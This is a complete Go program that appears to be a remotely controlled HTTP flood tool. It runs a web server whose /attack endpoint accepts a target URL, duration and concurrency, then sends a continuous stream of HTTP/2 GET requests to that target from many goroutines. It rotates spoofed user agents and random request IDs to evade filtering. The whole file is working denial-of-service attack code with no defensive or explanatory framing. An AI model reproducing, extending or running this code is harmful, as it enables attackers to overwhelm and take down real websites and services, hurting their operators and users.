package main

import (
	"encoding/json"
	"log"
	"math/rand"
	"net/http"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

type AttackRequest struct {
	URL         string `json:"url"`
	Duration    int    `json:"duration"`
	Concurrency int    `json:"concurrency"`
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
	"Mozilla/5.0 (X11; Linux x86_64)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
}

func randomHeaders() http.Header {
	h := http.Header{}
	h.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	h.Set("X-Request-ID", randomString(12))
	h.Set("Accept-Language", "en-US,en;q=0.9")
	return h
}

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func startAttack(url string, dur, conc int) {
	end := time.Now().Add(time.Duration(dur) * time.Second)
	transport := &http2.Transport{}
	client := &http.Client{Transport: transport}
	var wg sync.WaitGroup
	for i := 0; i < conc; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(end) {
				req, _ := http.NewRequest("GET", url, nil)
				req.Header = randomHeaders()
				client.Do(req)
			}
		}()
	}
	wg.Wait()
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	var req AttackRequest
	json.NewDecoder(r.Body).Decode(&req)
	go startAttack(req.URL, req.Duration, req.Concurrency)
	log.Printf("[+] Attack from %s -> %s (%ds, %d concurrency)\n", r.RemoteAddr, req.URL, req.Duration, req.Concurrency)
	w.Write([]byte("Attack accepted"))
}

func main() {
	rand.Seed(time.Now().UnixNano())
	http.HandleFunc("/attack", attackHandler)
	log.Println("Server ready on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
  }
